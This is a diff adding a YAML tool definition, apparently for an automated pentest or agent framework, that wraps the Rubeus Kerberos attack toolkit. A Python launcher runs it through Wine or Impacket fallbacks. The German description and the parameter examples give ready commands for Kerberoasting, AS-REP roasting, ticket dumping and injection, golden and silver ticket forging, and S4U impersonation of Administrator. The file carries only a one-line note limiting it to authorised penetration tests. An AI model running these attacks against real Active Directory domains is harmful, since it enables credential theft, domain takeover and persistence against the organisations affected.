@@ -1,0 +1,164 @@
+name: "rubeus"
+command: "python3"
+args:
+  - "-c"
+  - |
+    import subprocess
+    import sys
+    import shlex
+
+    if len(sys.argv) < 2:
+        sys.stderr.write("Kein Rubeus-Befehl angegeben\n")
+        sys.exit(1)
+
+    command = sys.argv[1]
+    extra = sys.argv[2] if len(sys.argv) > 2 else ""
+
+    # Rubeus via Wine oder direkte Ausführung auf Windows
+    # Auf Linux: via impacket oder direkte Ausführung prüfen
+    rubeus_paths = [
+        "/opt/Rubeus/Rubeus.exe",
+        "/tools/Rubeus.exe",
+        "Rubeus.exe"
+    ]
+
+    import os
+    rubeus_bin = None
+    for path in rubeus_paths:
+        if os.path.exists(path):
+            rubeus_bin = path
+            break
+
+    if rubeus_bin and rubeus_bin.endswith('.exe'):
+        # Ausführung über Wine auf Linux
+        cmd = ["wine", rubeus_bin, command]
+    elif rubeus_bin:
+        cmd = [rubeus_bin, command]
+    else:
+        # Fallback: Impacket für Kerberos-Operationen
+        sys.stdout.write("[*] Rubeus nicht gefunden. Verwende Impacket als Fallback...\n")
+        # Mapping von Rubeus-Befehlen zu Impacket
+        impacket_map = {
+            "asktgt": "getTGT.py",
+            "asktgs": "getST.py",
+            "describe": "ticketConverter.py",
+            "dump": "secretsdump.py",
+            "kerberoast": "GetUserSPNs.py",
+            "asreproast": "GetNPUsers.py",
+            "s4u": "getST.py",
+        }
+        impacket_tool = impacket_map.get(command.split()[0] if command else "", None)
+        if impacket_tool:
+            sys.stdout.write(f"[*] Impacket-Äquivalent: {impacket_tool} {extra}\n")
+            cmd = [impacket_tool] + (shlex.split(extra) if extra else [])
+        else:
+            sys.stdout.write(f"[!] Kein Impacket-Äquivalent für '{command}' gefunden.\n")
+            sys.stdout.write("[!] Installiere Rubeus: https://github.com/GhostPack/Rubeus\n")
+            sys.exit(0)
+
+    if extra:
+        cmd.extend(shlex.split(extra))
+
+    proc = subprocess.run(cmd, capture_output=True, text=True)
+    if proc.stdout:
+        sys.stdout.write(proc.stdout)
+    if proc.stderr:
+        sys.stderr.write(proc.stderr)
+    sys.exit(proc.returncode)
+enabled: true
+short_description: "Rubeus – Kerberos-Missbrauch (Golden/Silver Ticket, AS-REP Roasting, Kerberoasting)"
+description: |
+  Rubeus ist ein C# Toolset für Kerberos-Interaktion und -Missbrauch in Active Directory-Umgebungen.
+  Unterstützt alle gängigen Kerberos-Angriffe: Golden Ticket, Silver Ticket, AS-REP Roasting,
+  Kerberoasting, Pass-the-Ticket, Overpass-the-Hash.
+
+  **Hauptangriffe:**
+
+  **AS-REP Roasting (Konten ohne Kerberos Pre-Auth):**
+  ```bash
+  # Offline-crackbare Hashes extrahieren
+  Rubeus.exe asreproast /domain:corp.local /dc:dc.corp.local
+
+  # Mit Impacket-Äquivalent
+  GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt
+  ```
+
+  **Kerberoasting (Service Account Hashes):**
+  ```bash
+  # Alle SPNs angreifen
+  Rubeus.exe kerberoast /domain:corp.local /dc:dc.corp.local
+
+  # Impacket-Äquivalent
+  GetUserSPNs.py corp.local/user:pass -dc-ip 192.168.1.1 -request
+  ```
+
+  **TGT anfordern (Golden Ticket Vorbereitung):**
+  ```bash
+  # TGT mit Passwort
+  Rubeus.exe asktgt /user:admin /password:pass /domain:corp.local /dc:dc.corp.local
+
+  # TGT mit NTLM-Hash (Overpass-the-Hash)
+  Rubeus.exe asktgt /user:admin /rc4:8846f7eaee8fb117ad06bdd830b7586c /domain:corp.local /ptt
+  ```
+
+  **Pass-the-Ticket:**
+  ```bash
+  # Ticket aus Memory extrahieren
+  Rubeus.exe dump /luid:0x3e4
+
+  # Ticket injizieren
+  Rubeus.exe ptt /ticket:base64encodedticket
+
+  # Ticket aus Datei injizieren
+  Rubeus.exe ptt /ticket:ticket.kirbi
+  ```
+
+  **Golden Ticket:**
+  ```bash
+  # Voraussetzung: KRBTGT-Hash (aus DCSync)
+  Rubeus.exe golden /rc4:<krbtgt_hash> /domain:corp.local /sid:S-1-5-21-... /user:FakeAdmin /ptt
+  ```
+
+  **Silver Ticket:**
+  ```bash
+  # Service-spezifisches TGS fälschen
+  Rubeus.exe silver /service:cifs/server.corp.local /rc4:<machine_hash> /user:admin /domain:corp.local /ptt
+  ```
+
+  **Constrained Delegation S4U:**
+  ```bash
+  Rubeus.exe s4u /user:svcaccount /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/target /ptt
+  ```
+
+  **Verwendungsszenarien:**
+  - Active Directory Compromise
+  - Credential-basierte Lateral Movement
+  - Persistenz via Golden Ticket
+  - Service Account Kompromittierung
+
+  **Hinweise:**
+  - Auf Linux via Impacket-Äquivalente ausführbar
+  - Für Windows-Ausführung: Wine oder direkt auf Ziel
+  - Nur für autorisierte Penetrationstests
+parameters:
+  - name: "command"
+    type: "string"
+    description: |
+      Rubeus-Befehl. Beispiele:
+      - `asreproast /domain:corp.local /dc:dc.corp.local`
+      - `kerberoast /domain:corp.local`
+      - `asktgt /user:admin /password:pass /domain:corp.local /ptt`
+      - `ptt /ticket:ticket.kirbi`
+      - `golden /rc4:<hash> /domain:corp.local /sid:S-1-5-21-... /user:FakeAdmin /ptt`
+      - `dump /luid:0x3e4`
+      - `s4u /user:svc /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/target /ptt`
+    required: true
+    position: 0
+    format: "positional"
+  - name: "additional_args"
+    type: "string"
+    description: "Weitere Rubeus-Parameter"
+    required: false
+    default: ""
+    position: 1
+    format: "positional"
